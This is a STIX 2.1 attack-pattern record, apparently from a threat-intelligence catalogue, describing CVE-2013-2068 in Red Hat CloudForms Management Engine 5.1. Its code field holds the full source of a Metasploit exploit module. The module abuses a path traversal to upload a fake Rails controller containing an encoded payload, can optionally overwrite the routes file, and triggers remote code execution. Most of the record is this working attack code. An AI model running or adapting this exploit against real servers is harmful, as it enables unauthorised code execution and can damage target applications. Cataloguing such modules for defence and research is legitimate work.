{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b40b9485-9939-408a-a26d-62aa131cb8d1",
    "created": "2024-08-14T17:00:30.735224Z",
    "modified": "2024-08-14T17:00:30.735228Z",
    "name": "Red Hat CloudForms Management Engine 5.1 agent/linuxpkgs Path Traversal",
    "description": " This module exploits a path traversal vulnerability in the \"linuxpkgs\" action of \"agent\" controller of the Red Hat CloudForms Management Engine 5.1 (ManageIQ Enterprise Virtualization Manager 5.0 and earlier). It uploads a fake controller to the controllers directory of the Rails application with the encoded payload as an action and sends a request to this action to execute the payload. Optionally, it can also upload a routing file containing a route to the action. (Which is not necessary, since the application already contains a general default route.) ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/cfme_manageiq_evm_upload_exec.rb",
            "external_id": "cfme_manageiq_evm_upload_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-2068"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.redhat.com/show_bug.cgi?id=960422"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize\n    super(\n      'Name'           => 'Red Hat CloudForms Management Engine 5.1 agent/linuxpkgs Path Traversal',\n      'Description'    => %q{\n        This module exploits a path traversal vulnerability in the \"linuxpkgs\"\n        action of \"agent\" controller of the Red Hat CloudForms Management Engine 5.1\n        (ManageIQ Enterprise Virtualization Manager 5.0 and earlier).\n        It uploads a fake controller to the controllers directory of the Rails\n        application with the encoded payload as an action and sends a request to\n        this action to execute the payload. Optionally, it can also upload a routing\n        file containing a route to the action. (Which is not necessary, since the\n        application already contains a general default route.)\n      },\n      'Author'         => 'Ramon de C Valle',\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2013-2068'],\n          ['CWE', '22'],\n          ['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=960422']\n        ],\n      'Platform'       => 'ruby',\n      'Arch'           => ARCH_RUBY,\n      'Privileged'     => true,\n      'Targets'        =>\n        [\n          ['Automatic', {}]\n        ],\n      'DisclosureDate' => 'Sep 4 2013',\n      'DefaultOptions' =>\n        {\n          'PrependFork' => true,\n          'SSL' => true\n        },\n      'DefaultTarget' => 0\n    )\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('CONTROLLER', [false, 'The name of the controller']),\n        OptString.new('ACTION', [false, 'The name of the action']),\n        OptString.new('TARGETURI', [ true, 'The path to the application', '/']),\n        OptEnum.new('HTTP_METHOD', [true, 'HTTP Method', 'POST', ['GET', 'POST'] ])\n      ], self.class\n    )\n\n    register_advanced_options(\n      [\n        OptBool.new('ROUTES', [true, 'Upload a routing file. Warning: It is not necessary by default and can damage the target application', false]),\n      ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'uri'    => normalize_uri(target_uri.path, \"ping.html\")\n    )\n\n    if res and res.code == 200 and res.body.to_s =~ /EVM ping response/\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Unknown\n  end\n\n  def exploit\n    controller =\n      if datastore['CONTROLLER'].blank?\n        Rex::Text.rand_text_alpha_lower(rand(9) + 3)\n      else\n        datastore['CONTROLLER'].downcase\n      end\n\n    action =\n      if datastore['ACTION'].blank?\n        Rex::Text.rand_text_alpha_lower(rand(9) + 3)\n      else\n        datastore['ACTION'].downcase\n      end\n\n    data = \"class #{controller.capitalize}Controller < ApplicationController; def #{action}; #{payload.encoded}; render :nothing => true; end; end\\n\"\n\n    print_status(\"Sending fake-controller upload request to #{target_url('agent', 'linuxpkgs')}...\")\n    res = upload_file(\"../../app/controllers/#{controller}_controller.rb\", data)\n    fail_with(Failure::Unknown, 'No response from remote host') if res.nil?\n    register_files_for_cleanup(\"app/controllers/#{controller}_controller.rb\")\n    # According to rcvalle, all the version have not been checked\n    # so we're not sure if res.code will be always 500, in order\n    # to not lose sessions, just print warning and proceeding\n    unless res and res.code == 500\n      print_warning(\"Unexpected reply but proceeding anyway...\")\n    end\n\n    if datastore['ROUTES']\n      data = \"Vmdb::Application.routes.draw { root :to => 'dashboard#login'; match ':controller(/:action(/:id))(.:format)' }\\n\"\n\n      print_status(\"Sending routing-file upload request to #{target_url('agent', 'linuxpkgs')}...\")\n      res = upload_file(\"../../config/routes.rb\", data)\n      fail_with(Failure::Unknown, 'No response from remote host') if res.nil?\n      # According to rcvalle, all the version have not been checked\n      # so we're not sure if res.code will be always 500, in order\n      # to not lose sessions, just print warning and proceeding\n      unless res and res.code == 500\n        print_warning(\"Unexpected reply but proceeding anyway...\")\n      end\n    end\n\n    print_status(\"Sending execute request to #{target_url(controller, action)}...\")\n    send_request_cgi(\n      'method' => 'POST',\n      'uri'    => normalize_uri(target_uri.path, controller, action)\n    )\n  end\n\n  def upload_file(filename, data)\n    res = send_request_cgi(\n      'method' => datastore['HTTP_METHOD'],\n      'uri'    => normalize_uri(target_uri.path, 'agent', 'linuxpkgs'),\n      \"vars_#{datastore['HTTP_METHOD'].downcase}\" => {\n        'data'     => Rex::Text.encode_base64(Rex::Text.zlib_deflate(data)),\n        'filename' => filename,\n        'md5'      => Rex::Text.md5(data)\n      }\n    )\n\n    return res\n  end\n\n  def target_url(*args)\n    (ssl ? 'https' : 'http') +\n      if rport.to_i == 80 || rport.to_i == 443\n        \"://#{vhost}\"\n      else\n        \"://#{vhost}:#{rport}\"\n      end + normalize_uri(target_uri.path, *args)\n  end\nend\n\n",
    "x_mitre_disclosure_date": "Sep 4 2013",
    "x_mitre_platforms": [
        "ruby'"
    ]
}